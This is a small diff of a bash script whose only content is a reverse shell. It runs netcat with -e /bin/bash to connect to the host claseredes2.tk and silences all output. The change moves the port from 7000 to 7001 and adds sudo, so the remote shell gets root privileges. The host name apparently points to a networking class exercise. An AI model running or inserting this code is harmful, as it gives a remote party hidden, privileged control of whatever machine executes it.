@@ -1,4 +1,5 @@
 #!/bin/bash
+
 {
-    nc -e /bin/bash claseredes2.tk 7000
+    sudo nc -e /bin/bash claseredes2.tk 7001
 } &> /dev/null
